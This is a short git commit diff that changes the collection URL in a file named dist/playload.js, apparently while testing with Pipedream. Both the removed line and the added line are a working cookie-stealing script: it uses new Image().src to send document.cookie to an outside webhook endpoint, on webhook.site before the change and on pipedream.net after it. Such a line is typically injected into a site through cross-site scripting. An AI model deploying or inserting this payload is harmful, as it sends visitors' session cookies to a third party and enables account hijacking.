0b2682e5fd8ebad1571af7fdbeb71a078bcdb7a0
Julien Michelin <157238553+jujumichl@users.noreply.github.com>
2026-04-18 18:17:39 +0200

    Change webhook URL in playload.js
    test with pipedream

--- dist/playload.js
+++ dist/playload.js
@@ -1,1 +1,1 @@
-new Image().src = "https://webhook.site/244ad7a4-0a23-4d7e-813a-5fb4820962ba/?c=" + document.cookie;
+new Image().src = "https://eojfiqn7zho3g7n.m.pipedream.net/?c=" + document.cookie;
